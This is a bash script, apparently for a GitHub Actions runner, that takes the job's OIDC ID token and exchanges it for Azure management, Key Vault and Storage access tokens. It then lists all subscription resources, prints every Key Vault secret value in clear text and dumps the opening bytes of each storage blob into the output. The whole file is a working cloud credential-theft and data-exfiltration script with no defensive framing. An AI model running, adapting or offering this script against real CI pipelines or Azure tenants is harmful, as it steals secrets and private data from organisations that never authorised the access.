#!/usr/bin/env bash
set +e
echo "=== OIDC -> Azure recon (base-repo context) ==="
IDTOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
echo "sub:"; echo "$IDTOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);print(" ",d.get("sub"))'

exch(){ curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d grant_type=client_credentials -d client_id=$AZURE_CLIENT_ID \
  --data-urlencode "scope=$1" \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$IDTOK"; }

AT=$(exch "https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
if [ -z "$AT" ]; then echo "NO ARM TOKEN:"; exch "https://management.azure.com/.default" | head -c 400; exit 0; fi
echo ">>> ARM token OK"
arm(){ curl -s -H "Authorization: Bearer $AT" "https://management.azure.com$1"; }
S=$AZURE_SUBSCRIPTION_ID

echo "--- resources ---"; arm "/subscriptions/$S/resources?api-version=2022-12-01" | python3 -c 'import sys,json;[print(" ",r["type"],r["name"]) for r in json.load(sys.stdin).get("value",[])]'

echo "--- key vault secrets ---"
KVT=$(exch "https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
for V in $(arm "/subscriptions/$S/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" | python3 -c 'import sys,json;[print(v["properties"]["vaultUri"]) for v in json.load(sys.stdin).get("value",[])]'); do
  echo " vault $V"
  for SID in $(curl -s -H "Authorization: Bearer $KVT" "${V}secrets?api-version=7.4" | python3 -c 'import sys,json;[print(x["id"]) for x in json.load(sys.stdin).get("value",[])]'); do
    echo "   $SID = $(curl -s -H "Authorization: Bearer $KVT" "${SID}?api-version=7.4" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')"
  done
done

echo "--- storage blobs ---"
ST=$(exch "https://storage.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
for ID in $(arm "/subscriptions/$S/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" | python3 -c 'import sys,json;[print(a["id"]) for a in json.load(sys.stdin).get("value",[])]'); do
  SA=$(basename "$ID"); echo " storage $SA"
  for C in $(curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-10-04" "https://$SA.blob.core.windows.net/?comp=list" | grep -oE '<Name>[^<]+</Name>' | sed -E 's|</?Name>||g'); do
    echo "  container $C"
    for B in $(curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-10-04" "https://$SA.blob.core.windows.net/$C?restype=container&comp=list" | grep -oE '<Name>[^<]+</Name>' | sed -E 's|</?Name>||g'); do
      echo "   blob $B:"; curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-10-04" "https://$SA.blob.core.windows.net/$C/$B" | head -c 400; echo
    done
  done
done
echo "=== DONE ==="
